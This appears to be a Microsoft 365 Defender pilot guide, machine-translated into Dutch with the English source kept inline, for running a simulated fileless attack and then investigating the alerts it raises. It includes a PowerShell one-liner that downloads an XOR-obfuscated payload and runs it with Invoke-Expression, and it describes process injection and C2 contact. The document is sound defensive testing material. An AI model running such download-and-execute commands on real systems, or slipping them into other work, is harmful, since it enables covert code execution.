---
title: Uw Microsoft 365 Defender-aanvals simulaties uitvoeren
description: Simuleer simulaties voor uw Microsoft 365-app voor prototype om te zien hoe deze wordt uitgevouwen en snel wordt hersteld.
keywords: Microsoft Threat Protection pilot aanval, simulatie aanval van de proefversie van Microsoft Threat Protection, Microsoft Threat Protection pilotproject, Cyber beveiliging, Geavanceerd permanent risico, veiligheid van uw onderneming, apparatuur, apparaat, identiteit, gebruikers, gegevens, toepassingen, incidenten, automatisch onderzoek en herstel, geavanceerde jacht
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.openlocfilehash: fac3a79f1522e5e7777b2b54bce2b8bd695f8d7a
ms.sourcegitcommit: ce46d1bd67091d4ed0e2b776dfed55e2d88cdbf4
ms.translationtype: MT
ms.contentlocale: nl-NL
ms.lasthandoff: 11/18/2020
ms.locfileid: "49131343"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a><span data-ttu-id="2baee-104">Uw Microsoft 365 Defender-aanvals simulaties uitvoeren</span><span class="sxs-lookup"><span data-stu-id="2baee-104">Run your Microsoft 365 Defender attack simulations</span></span>  

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|<span data-ttu-id="2baee-105">[![Planning](../../media/phase-diagrams/1-planning.png)](mtp-pilot-plan.md)</span><span class="sxs-lookup"><span data-stu-id="2baee-105">[![Planning](../../media/phase-diagrams/1-planning.png)](mtp-pilot-plan.md)</span></span><br/>[<span data-ttu-id="2baee-106">Planning</span><span class="sxs-lookup"><span data-stu-id="2baee-106">Planning</span></span>](mtp-pilot-plan.md) |<span data-ttu-id="2baee-107">[![Voorbereiden](../../media/phase-diagrams/2-prepare.png)](prepare-mtpeval.md)</span><span class="sxs-lookup"><span data-stu-id="2baee-107">[![Prepare](../../media/phase-diagrams/2-prepare.png)](prepare-mtpeval.md)</span></span><br/>[<span data-ttu-id="2baee-108">Uitwerking</span><span class="sxs-lookup"><span data-stu-id="2baee-108">Preparation</span></span>](prepare-mtpeval.md) | ![Een aanval simuleren](../../media/phase-diagrams/3-simluate.png)<br/><span data-ttu-id="2baee-110">Een aanval simuleren</span><span class="sxs-lookup"><span data-stu-id="2baee-110">Simulate attack</span></span>| <span data-ttu-id="2baee-111">[![Sluiten en samenvatten](../../media/phase-diagrams/4-summary.png)](mtp-pilot-close.md)</span><span class="sxs-lookup"><span data-stu-id="2baee-111">[![Close and summarize](../../media/phase-diagrams/4-summary.png)](mtp-pilot-close.md)</span></span><br/>[<span data-ttu-id="2baee-112">Sluiten en samenvatten</span><span class="sxs-lookup"><span data-stu-id="2baee-112">Close and summarize</span></span>](mtp-pilot-close.md)|
|--|--|--|--|
|| |<span data-ttu-id="2baee-113">*Dat is alles!*</span><span class="sxs-lookup"><span data-stu-id="2baee-113">*You are here!*</span></span> | |

<span data-ttu-id="2baee-114">U bevindt zich momenteel in de simulatie fase aanval.</span><span class="sxs-lookup"><span data-stu-id="2baee-114">You're currently in the attack simulation phase.</span></span>

<span data-ttu-id="2baee-115">Nadat u de testomgeving hebt voorbereid, kunt u het beste het Microsoft 365 Defender-incidentbeheer en het geautomatiseerde onderzoek-en herstelmogelijkheden testen.</span><span class="sxs-lookup"><span data-stu-id="2baee-115">After preparing your pilot environment, it’s time to test the Microsoft 365 Defender incident management and automated investigation and remediation capabilities.</span></span> <span data-ttu-id="2baee-116">We helpen u een verfijnde aanval te simuleren die geavanceerde technieken van detectie van detectie biedt.</span><span class="sxs-lookup"><span data-stu-id="2baee-116">We'll help you to simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="2baee-117">De aanval wordt geopend server bericht blok (SMB)-sessies op domeincontrollers opgesomd en de nieuwste IP-adressen van gebruikers apparaten ophalen.</span><span class="sxs-lookup"><span data-stu-id="2baee-117">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users’ devices.</span></span> <span data-ttu-id="2baee-118">Meestal bevat dit soort aanvallen geen bestanden die op het apparaat van het slachtoffer worden neergezet, ze worden alleen in het geheugen weergegeven.</span><span class="sxs-lookup"><span data-stu-id="2baee-118">This category of attacks usually doesn’t include files dropped on the victim’s device—they occur solely in memory.</span></span> <span data-ttu-id="2baee-119">Met behulp van de bestaande systeem-en beheerprogramma's, en de programmacode wordt in systeemprocessen geïnjecteerd om de uitvoering ervan te verbergen, kunnen ze door een dergelijk gedrag evade detectie en persistent maken op het apparaat.</span><span class="sxs-lookup"><span data-stu-id="2baee-119">They “live off the land” by using existing system and administrative tools and inject their code into system processes to hide their execution, Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="2baee-120">In deze simulatie begint ons voorbeeldscenario met een PowerShell-script.</span><span class="sxs-lookup"><span data-stu-id="2baee-120">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="2baee-121">Een gebruiker kan een script uitvoeren.</span><span class="sxs-lookup"><span data-stu-id="2baee-121">A user might be tricked into running a script.</span></span> <span data-ttu-id="2baee-122">Of het script kan vanaf een externe verbinding vanaf een eerder besmet apparaat worden uitgevoerd vanaf een externe verbinding met een andere computer: de aanvaller probeert later te navigeren in het netwerk.</span><span class="sxs-lookup"><span data-stu-id="2baee-122">Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network.</span></span> <span data-ttu-id="2baee-123">Detectie van deze scripts kan lastig zijn omdat beheerders vaak scripts ook extern uitvoeren om diverse beheeractiviteiten uit te voeren.</span><span class="sxs-lookup"><span data-stu-id="2baee-123">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![Niet-gefileeerde PowerShell-aanval met proces injectie en SMB Reconnaisance-aanvals diagram](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="2baee-125">Tijdens de simulatie injecteert de aanval shellcode in een schijnbaar onschuldige proces.</span><span class="sxs-lookup"><span data-stu-id="2baee-125">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="2baee-126">Voor dit scenario is het gebruik van notepad.exe vereist.</span><span class="sxs-lookup"><span data-stu-id="2baee-126">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="2baee-127">We hebben dit proces voor de simulatie gekozen, maar kwaadwillende gebruikers zouden waarschijnlijk een lang actief systeemproces kunnen bereiken, zoals svchost.exe.</span><span class="sxs-lookup"><span data-stu-id="2baee-127">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="2baee-128">Met de shellcode kunt u contact opnemen met de opdracht van de aanvaller en de controle (C2) om instructies te ontvangen voor het doorvoeren van de gebruikersnaam.</span><span class="sxs-lookup"><span data-stu-id="2baee-128">The shellcode then goes on to contact the attacker’s command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="2baee-129">Het script probeert Reconnaissance-query's uit te voeren op de domeincontroller (DC).</span><span class="sxs-lookup"><span data-stu-id="2baee-129">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="2baee-130">Reconnaissance biedt een kwaadwillende persoon de mogelijkheid informatie te krijgen over recente gebruikers aanmeldinformatie.</span><span class="sxs-lookup"><span data-stu-id="2baee-130">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="2baee-131">Wanneer hackers deze informatie hebben, kunnen ze later in het netwerk navigeren om naar een specifiek gevoelige account te gaan.</span><span class="sxs-lookup"><span data-stu-id="2baee-131">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

>[!IMPORTANT]
><span data-ttu-id="2baee-132">Voor optimale resultaten volgt u de instructies voor de simulatie van een aanval.</span><span class="sxs-lookup"><span data-stu-id="2baee-132">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>


## <a name="simulation-environment-requirements"></a><span data-ttu-id="2baee-133">Vereisten voor simulatie omgeving</span><span class="sxs-lookup"><span data-stu-id="2baee-133">Simulation environment requirements</span></span>

<span data-ttu-id="2baee-134">Aangezien u de testomgeving al hebt geconfigureerd tijdens de voorbereidende fase, moet u ervoor zorgen dat u twee apparaten hebt voor dit scenario: een testapparaat en een domeincontroller.</span><span class="sxs-lookup"><span data-stu-id="2baee-134">Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.</span></span>

1.  <span data-ttu-id="2baee-135">Controleer of uw Tenant [Microsoft 365 Defender heeft ingeschakeld](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span><span class="sxs-lookup"><span data-stu-id="2baee-135">Verify your tenant has [enabled Microsoft 365 Defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>

2.  <span data-ttu-id="2baee-136">Controleer de configuratie van de domeincontroller voor testen:</span><span class="sxs-lookup"><span data-stu-id="2baee-136">Verify your test domain controller configuration:</span></span>

    - <span data-ttu-id="2baee-137">Apparaat wordt uitgevoerd met Windows Server 2008 R2 of een latere versie.</span><span class="sxs-lookup"><span data-stu-id="2baee-137">Device runs with Windows Server 2008 R2 or a later version.</span></span>
    - <span data-ttu-id="2baee-138">De test domeincontroller naar [Microsoft Defender for Identity](https://docs.microsoft.com/azure/security-center/security-center-wdatp) en [Remote Management](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager)in te schakelen.</span><span class="sxs-lookup"><span data-stu-id="2baee-138">The test domain controller to [Microsoft Defender for Identity](https://docs.microsoft.com/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>    
    - <span data-ttu-id="2baee-139">Controleer of [Microsoft Defender voor Microsoft Cloud-beveiliging](https://docs.microsoft.com/cloud-app-security/aatp-integration) is ingeschakeld.</span><span class="sxs-lookup"><span data-stu-id="2baee-139">Verify that [Microsoft Defender for Identity and Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/aatp-integration) have been enabled.</span></span>
    - <span data-ttu-id="2baee-140">Een testgebruiker wordt in uw domein gemaakt – geen beheerdersmachtigingen nodig.</span><span class="sxs-lookup"><span data-stu-id="2baee-140">A test user is created on your domain – no admin permissions needed.</span></span>

3.  <span data-ttu-id="2baee-141">Controleer de configuratie van de testapparatuur:</span><span class="sxs-lookup"><span data-stu-id="2baee-141">Verify test device configuration:</span></span>
 
    1.  <span data-ttu-id="2baee-142">Een apparaat met Windows 10 versie 1903 of een latere versie wordt uitgevoerd.</span><span class="sxs-lookup"><span data-stu-id="2baee-142">Device runs with Windows 10 version 1903 or a later version.</span></span>
    
    1.  <span data-ttu-id="2baee-143">Testapparaat is verbonden met het test domein.</span><span class="sxs-lookup"><span data-stu-id="2baee-143">Test device is joined to the test domain.</span></span>
    
    1.  <span data-ttu-id="2baee-144">[Schakel Windows Defender antivirus in](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span><span class="sxs-lookup"><span data-stu-id="2baee-144">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="2baee-145">Als u problemen ondervindt bij het inschakelen van Windows Defender antivirus, raadpleegt u dit [onderwerp over probleemoplossing](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span><span class="sxs-lookup"><span data-stu-id="2baee-145">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    
    1.  <span data-ttu-id="2baee-146">Controleer of het testapparaat is [geboardd naar Microsoft Defender for Endpoint](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span><span class="sxs-lookup"><span data-stu-id="2baee-146">Verify that the test device is [onboarded to Microsoft Defender for Endpoint)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="2baee-147">Als u een bestaande Tenant gebruikt en apparaatgroepen implementeert, maakt u een speciale apparaatklasse voor het testapparaat en duwt u dit naar het hoogste niveau in de configuratie UX.</span><span class="sxs-lookup"><span data-stu-id="2baee-147">If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.</span></span>


## <a name="run-the-simulation"></a><span data-ttu-id="2baee-148">De simulatie uitvoeren</span><span class="sxs-lookup"><span data-stu-id="2baee-148">Run the simulation</span></span>

<span data-ttu-id="2baee-149">De simulatie van het aanvalsscenario uitvoeren:</span><span class="sxs-lookup"><span data-stu-id="2baee-149">To run the attack scenario simulation:</span></span>

1.  <span data-ttu-id="2baee-150">Meld u aan bij het testapparaat met het gebruikersaccount testen.</span><span class="sxs-lookup"><span data-stu-id="2baee-150">Log in to the test device with the test user account.</span></span>

2.  <span data-ttu-id="2baee-151">Open een Windows PowerShell-venster op het testapparaat.</span><span class="sxs-lookup"><span data-stu-id="2baee-151">Open a Windows PowerShell window on the test device.</span></span>

3.  <span data-ttu-id="2baee-152">Kopieer het volgende simulatie script:</span><span class="sxs-lookup"><span data-stu-id="2baee-152">Copy the following simulation script:</span></span>

    ```powershell
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
    = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
    -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
    ```
    
    > [!NOTE]
    > <span data-ttu-id="2baee-153">Als u dit document opent in een webbrowser, kunt u problemen ondervinden met het kopiëren van de volledige tekst zonder dat u bepaalde tekens kwijtraakt of om extra regeleinden te voorkomen.</span><span class="sxs-lookup"><span data-stu-id="2baee-153">If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="2baee-154">Download dit document en open het in Adobe Reader.</span><span class="sxs-lookup"><span data-stu-id="2baee-154">Download this document and open it on Adobe Reader.</span></span>

4. <span data-ttu-id="2baee-155">Plak en voer het gekopieerde script uit wanneer u hierom wordt gevraagd.</span><span class="sxs-lookup"><span data-stu-id="2baee-155">At the prompt, paste and run the copied script.</span></span>

>[!NOTE]
><span data-ttu-id="2baee-156">Als u PowerShell uitvoert met Remote Desktop Protocol (RDP), gebruikt u de opdracht Klembord tekst typen in de RDP-client, aangezien de **CTRL-V** -sneltoets of de rechtermuisknop functie mogelijk niet werkt.</span><span class="sxs-lookup"><span data-stu-id="2baee-156">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span>  <span data-ttu-id="2baee-157">In recente versies van PowerShell wordt de methode soms ook niet geaccepteerd, u moet mogelijk eerst naar Kladblok kopiëren, dit in de virtuele machine kopiëren en vervolgens in PowerShell plakken.</span><span class="sxs-lookup"><span data-stu-id="2baee-157">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="2baee-158">Een paar seconden later <i>notepad.exe</i> wordt geopend.</span><span class="sxs-lookup"><span data-stu-id="2baee-158">A few seconds later, <i>notepad.exe</i> will open.</span></span> <span data-ttu-id="2baee-159">Een gesimuleerde aanvals code wordt in notepad.exe geïnjecteerd.</span><span class="sxs-lookup"><span data-stu-id="2baee-159">A simulated attack code will be injected into notepad.exe.</span></span> <span data-ttu-id="2baee-160">Zorg dat het automatisch gegenereerde Notepad-exemplaar geopend blijft voor het volledige scenario.</span><span class="sxs-lookup"><span data-stu-id="2baee-160">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="2baee-161">De gesimuleerde aanvaller probeert met een extern IP-adres te communiceren (de C2-server te simuleren) en probeert vervolgens Reconnaissance te communiceren via de domeincontroller via SMB.</span><span class="sxs-lookup"><span data-stu-id="2baee-161">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="2baee-162">U ziet een bericht dat wordt weergegeven op de PowerShell-console wanneer dit script is voltooid.</span><span class="sxs-lookup"><span data-stu-id="2baee-162">You'll see a message displayed on the PowerShell console when this script completes.</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0      
```

<span data-ttu-id="2baee-163">Als u de functie automatisch incidenten en antwoord in actie wilt zien, moet u de notepad.exe open laten.</span><span class="sxs-lookup"><span data-stu-id="2baee-163">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="2baee-164">U ziet een automatisch incident en antwoord stopt het Kladblok proces.</span><span class="sxs-lookup"><span data-stu-id="2baee-164">You'll see Automated Incident and Response stop the Notepad process.</span></span>


## <a name="investigate-an-incident"></a><span data-ttu-id="2baee-165">Een incident onderzoeken</span><span class="sxs-lookup"><span data-stu-id="2baee-165">Investigate an incident</span></span>

>[!NOTE]
><span data-ttu-id="2baee-166">Bekijk eerst de volgende video om te zien hoe het beheer van uw contactpersonen u helpt bij het onderzoek, waar u deze kunt vinden in de portal, en hoe u het kunt helpen bij het uitvoeren van beveiligingsbewerkingen:</span><span class="sxs-lookup"><span data-stu-id="2baee-166">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="2baee-167">Als u overstapt op het punt van de burger Analyst-weergave, kunt u nu beginnen met het onderzoeken van de aanval in de portal Microsoft 365 Security Center.</span><span class="sxs-lookup"><span data-stu-id="2baee-167">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.</span></span> 

1.  <span data-ttu-id="2baee-168">Open de wachtrij voor incidenten van [Microsoft 365 Security Center](https://security.microsoft.com/incidents) van elk apparaat.</span><span class="sxs-lookup"><span data-stu-id="2baee-168">Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.</span></span>

2.  <span data-ttu-id="2baee-169">Ga in het menu naar **incidenten** .</span><span class="sxs-lookup"><span data-stu-id="2baee-169">Navigate to **Incidents** from the menu.</span></span> 

    ![Schermafbeelding van incidenten zoals weergegeven op het menu aan de linkerkant van het Microsoft 365-Beveiligingscentrum](../../media/mtp/fig1.png)

3.  <span data-ttu-id="2baee-171">Het nieuwe incident voor de gesimuleerde aanval wordt weergegeven in de wachtrij voor incidenten.</span><span class="sxs-lookup"><span data-stu-id="2baee-171">The new incident for the simulated attack will appear in the incident queue.</span></span>
 
    ![Schermafbeelding van de incidenten wachtrij](../../media/mtp/fig2.png)


### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="2baee-173">Onderzoek een aanval als één incident</span><span class="sxs-lookup"><span data-stu-id="2baee-173">Investigate the attack as a single incident</span></span>

<span data-ttu-id="2baee-174">Microsoft 365 Defender vergelijkt de analyse en voegt alle gerelateerde waarschuwingen en onderzoek van verschillende producten samen tot één incident entiteit.</span><span class="sxs-lookup"><span data-stu-id="2baee-174">Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="2baee-175">Op deze manier laat Microsoft 365 Defender een verhaal met een bredere aanval zien, zodat de SOC-analist begrijpt en op ingewikkelde bedreigingen kan reageren.</span><span class="sxs-lookup"><span data-stu-id="2baee-175">By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="2baee-176">De waarschuwingen die zijn gegenereerd tijdens deze simulatie, worden geassocieerd met dezelfde bedreiging, en worden als resultaat automatisch geaggregeerd als één incident.</span><span class="sxs-lookup"><span data-stu-id="2baee-176">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="2baee-177">Het incident weergeven:</span><span class="sxs-lookup"><span data-stu-id="2baee-177">To view the incident:</span></span>

1.  <span data-ttu-id="2baee-178">Ga naar de wachtrij voor **incidenten** .</span><span class="sxs-lookup"><span data-stu-id="2baee-178">Navigate to the **Incidents** queue.</span></span>
 
    ![Schermafbeelding van incidenten in het navigatiemenu](../../media/mtp/fig1.png)

2.  <span data-ttu-id="2baee-180">Selecteer het nieuwste item door te klikken op de cirkel die zich links van de naam van het incident bevindt.</span><span class="sxs-lookup"><span data-stu-id="2baee-180">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="2baee-181">Aan een side panel wordt aanvullende informatie over het incident weergegeven, inclusief alle verwante meldingen.</span><span class="sxs-lookup"><span data-stu-id="2baee-181">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="2baee-182">Elk incident heeft een unieke naam waarmee dit wordt beschreven op basis van de kenmerken van de meldingen die dit bevat.</span><span class="sxs-lookup"><span data-stu-id="2baee-182">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

    ![Schermafbeelding van de pagina met incidenten waarop gegenereerde waarschuwingen worden geaggregeerd tijdens de simulatie](../../media/mtp/fig4.png)

    <span data-ttu-id="2baee-184">De waarschuwingen die in het dashboard worden weergegeven, kunt u filteren op basis van servicebronnen: Microsoft Defender for Identity, Microsoft Cloud app Security, Microsoft Defender for Endpoint, Microsoft 365 Defender en Microsoft Defender for Office 365.</span><span class="sxs-lookup"><span data-stu-id="2baee-184">The alerts that show in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.</span></span>  

3.  <span data-ttu-id="2baee-185">Selecteer **incident pagina openen** om meer informatie over het incident te weten te komen.</span><span class="sxs-lookup"><span data-stu-id="2baee-185">Select **Open incident page** to get more information about the incident.</span></span>

    <span data-ttu-id="2baee-186">Op de pagina **incidenten** ziet u alle meldingen en informatie over het incident.</span><span class="sxs-lookup"><span data-stu-id="2baee-186">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="2baee-187">De informatie omvat de entiteiten en assets die deel uitmaken van de waarschuwing, de detectiebron van de waarschuwingen (Microsoft Defender for Identity, EDR), en de reden waarom ze aan elkaar zijn gekoppeld.</span><span class="sxs-lookup"><span data-stu-id="2baee-187">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (Microsoft Defender for Identity, EDR), and the reason they were linked together.</span></span> <span data-ttu-id="2baee-188">Wanneer u de lijst met incidenten van meldingen controleert, wordt de voortgang van de aanval weergegeven.</span><span class="sxs-lookup"><span data-stu-id="2baee-188">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="2baee-189">In deze weergave kunt u de afzonderlijke waarschuwingen zien en onderzoeken.</span><span class="sxs-lookup"><span data-stu-id="2baee-189">From this view, you can see and investigate the individual alerts.</span></span>

    <span data-ttu-id="2baee-190">U kunt ook klikken op **incident beheren** in het menu aan de rechterkant, om het incident te markeren, het aan uzelf toe te wijzen en opmerkingen toe te voegen.</span><span class="sxs-lookup"><span data-stu-id="2baee-190">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

    ![Schermafbeelding van de locatie waarop u wilt klikken](../../media/mtp/fig5a.png)

    ![<span data-ttu-id="2baee-192">Schermafbeelding van de velden in het deelvenster incident beheren, waar u het incident kunt markeren, het aan uzelf kunt toewijzen en opmerkingen kunt toevoegen</span><span class="sxs-lookup"><span data-stu-id="2baee-192">Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments</span></span> ](../../media/mtp/fig5b.png)


### <a name="review-generated-alerts"></a><span data-ttu-id="2baee-193">Gegenereerde waarschuwingen controleren</span><span class="sxs-lookup"><span data-stu-id="2baee-193">Review generated alerts</span></span> 

<span data-ttu-id="2baee-194">Laten we eens kijken naar enkele waarschuwingen die zijn gegenereerd tijdens de gesimuleerde aanval.</span><span class="sxs-lookup"><span data-stu-id="2baee-194">Let’s look at some of the alerts generated during the simulated attack.</span></span>

>[!NOTE]
><span data-ttu-id="2baee-195">We lopen slechts enkele waarschuwingen die zijn gegenereerd tijdens de gesimuleerde aanval.</span><span class="sxs-lookup"><span data-stu-id="2baee-195">We’ll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="2baee-196">Afhankelijk van de versie van Windows en de Microsoft 365 Defender-producten die op uw testapparaat worden uitgevoerd, ziet u mogelijk meer waarschuwingen die in iets anders worden weergegeven.</span><span class="sxs-lookup"><span data-stu-id="2baee-196">Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![Schermafbeelding van gegenereerde waarschuwingen](../../media/mtp/fig6.png) 


<span data-ttu-id="2baee-198">**Waarschuwing: verdacht verdacht proces injectie (Bron: Microsoft Defender voor eindpunt EDR)**</span><span class="sxs-lookup"><span data-stu-id="2baee-198">**Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint EDR)**</span></span>

<span data-ttu-id="2baee-199">Geavanceerde kwaadwillende gebruikers gebruiken verfijnde en verfijnde methoden om in het geheugen te blijven staan en ze te verbergen voor detectie hulpprogramma's.</span><span class="sxs-lookup"><span data-stu-id="2baee-199">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="2baee-200">U kunt zich een gang doen vanuit een vertrouwd systeemproces, in plaats van een schadelijk uitvoerbaar bestand, zodat u het programma moeilijk kunt detecteren en beveiligingsbewerkingen kunt uitvoeren.</span><span class="sxs-lookup"><span data-stu-id="2baee-200">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="2baee-201">Om ervoor te zorgen dat de SOC-analisten deze geavanceerde aanvallen kunnen ondervangen, biedt u onze cloudservice met onopvallende zichtbare informatie in een groot aantal injectie technieken met cross-process code.</span><span class="sxs-lookup"><span data-stu-id="2baee-201">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="2baee-202">In de volgende afbeelding ziet u hoe u met een eindpunt van de <i>notepad.exe</i></span><span class="sxs-lookup"><span data-stu-id="2baee-202">The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![Schermafbeelding van de melding voor de injectie van mogelijk schadelijke code](../../media/mtp/fig7.png) 


<span data-ttu-id="2baee-204">**Waarschuwing: het onverwachte gedrag van een proces wordt uitgevoerd met geen opdrachtregelargumenten (Bron: Microsoft Defender voor eindpunt EDR)**</span><span class="sxs-lookup"><span data-stu-id="2baee-204">**Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint EDR)**</span></span>

<span data-ttu-id="2baee-205">Microsoft Defender voor eindpunten detecteren vaak het meest voorkomende kenmerk van een aanvalsmethode.</span><span class="sxs-lookup"><span data-stu-id="2baee-205">Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="2baee-206">Deze methode zorgt voor duurzaamheid en veroorzaakt een nieuwe tactiek voor de balk voor hackers.</span><span class="sxs-lookup"><span data-stu-id="2baee-206">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="2baee-207">We maken gebruik van leer algoritmen voor grootschalige lessen om het normale gedrag van gemeenschappelijke processen binnen een organisatie en wereldwijd te bepalen, en kijken wanneer deze processen afwijkend gedrag tonen.</span><span class="sxs-lookup"><span data-stu-id="2baee-207">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="2baee-208">Dit anomalie gedrag duidt vaak op dat de programmacode is ingevoerd en wordt uitgevoerd in een ander vertrouwd proces.</span><span class="sxs-lookup"><span data-stu-id="2baee-208">These anomalous behaviors often indicate that extraneous code was introduced and are running in an otherwise trusted process.</span></span>

<span data-ttu-id="2baee-209">Voor dit scenario verloopt het proces <i>notepad.exe</i> abnormaal gedrag, waarbij communicatie met een externe locatie wordt aangewend.</span><span class="sxs-lookup"><span data-stu-id="2baee-209">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="2baee-210">Dit resultaat is onafhankelijk van de specifieke methode die wordt gebruikt om de schadelijke code in te voeren en uit te voeren.</span><span class="sxs-lookup"><span data-stu-id="2baee-210">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

>[!NOTE]
